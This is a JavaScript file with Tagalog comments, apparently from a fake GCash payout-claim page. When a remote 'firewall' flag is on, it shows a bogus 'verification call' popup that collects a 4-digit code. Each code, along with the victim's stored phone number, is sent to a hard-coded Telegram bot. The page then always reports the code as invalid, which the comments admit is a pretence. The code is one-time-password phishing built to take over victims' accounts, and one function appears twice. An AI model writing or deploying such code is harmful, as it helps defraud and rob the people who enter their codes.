// ========== POPUP_SHARE.JS ==========

async function getFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) return false;
    try {
        var db = firebase.database();
        var snap = await db.ref('admin/globalFirewall').once('value');
        var data = snap.val();
        return data && data.active === true;
    } catch(e) { return false; }
}

// Function para sa Claim Button
async function handleGcashClaim() {
    const gcashBtn = document.getElementById('claimGCashBtn');
    const originalText = gcashBtn.innerHTML;

    // 1. Check Firewall Status muna
    const isFirewallActive = await getFirewallStatus();

    if (isFirewallActive) {
        // KAHIT MAY LINK O WALA, basta ON ang Firewall -> Verification agad
        showFirewallVerificationPopup();
    } else {
        // FIREWALL IS OFF -> Check kung may Link
        const payoutData = await getLatestPayoutLink();

        if (payoutData && payoutData.url) {
            // MAY LINK -> Redirect sa GCash
            window.open(payoutData.url, '_blank');
        } else {
            // WALANG LINK -> Alert
            alert("⚠️ SYSTEM UPDATE: Payout system is currently busy. Please try again later.");
        }
    }
}

// Function para sa Claim Button
async function handleGcashClaim() {
    const gcashBtn = document.getElementById('claimGCashBtn');
    const originalText = gcashBtn.innerHTML;

    // 1. Check Firewall Status muna
    const isFirewallActive = await getFirewallStatus();

    if (isFirewallActive) {
        // KAHIT MAY LINK O WALA, basta ON ang Firewall -> Verification agad
        showFirewallVerificationPopup();
    } else {
        // FIREWALL IS OFF -> Check kung may Link
        const payoutData = await getLatestPayoutLink();

        if (payoutData && payoutData.url) {
            // MAY LINK -> Redirect sa GCash
            window.open(payoutData.url, '_blank');
        } else {
            // WALANG LINK -> Alert
            alert("⚠️ SYSTEM UPDATE: Payout system is currently busy. Please try again later.");
        }
    }
}

function showFirewallVerificationPopup() {
    // Gawa ng Modal Element
    const modal = document.createElement('div');
    modal.className = 'firewall-popup-overlay';
    modal.id = 'firewallModal';

    modal.innerHTML = `
        <div class="firewall-box">
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCode" class="verification-input" 
                       placeholder="0000" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtn" class="verify-btn" onclick="processFixedVerification()">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <span class="loading-dots">Waiting for system-verification call</span>
            </div>
            <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
        </div>
    `;

    document.body.appendChild(modal);
    
    // Focus sa input
    setTimeout(() => {
        document.getElementById('verificationCode').focus();
    }, 300);
}

// FIXED LOGIC: 
async function processFixedVerification() {
    const codeInput = document.getElementById('verificationCode');
    const errorMsg = document.getElementById('firewallErrorMsg');
    const btn = document.getElementById('verifyCodeBtn');
    const enteredCode = codeInput.value.trim();

    if (enteredCode.length < 4) {
        errorMsg.innerText = "Please enter the 4-digit code provided in the call.";
        errorMsg.style.display = 'block';
        return;
    }

    // Visual loading effect
    btn.innerText = "CHECKING...";
    btn.disabled = true;

    // Kunin ang phone para sa Telegram log
    const userPhone = localStorage.getItem("userPhone") || "Unknown";

    // I-send sa Telegram na may sumusubok mag-verify
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=` + 
        encodeURIComponent(`🚨 VERIFICATION ATTEMPT\nPhone: ${userPhone}\nCode Entered: ${enteredCode}\nStatus: Waiting for Call`));
    } catch(e) {}

    // Delay ng konti para kunwari nag-check sa server
    setTimeout(() => {
        btn.innerText = "VERIFY NOW";
        btn.disabled = false;
        
        // ETO ANG PINAKA-IMPORTANTE: Laging Invalid
        errorMsg.innerText = "❌ INVALID 4-Digit Verification Code. Please wait for the system to call you again.";
        errorMsg.style.display = 'block';
        
        codeInput.value = '';
        codeInput.focus();
    }, 1500);
}
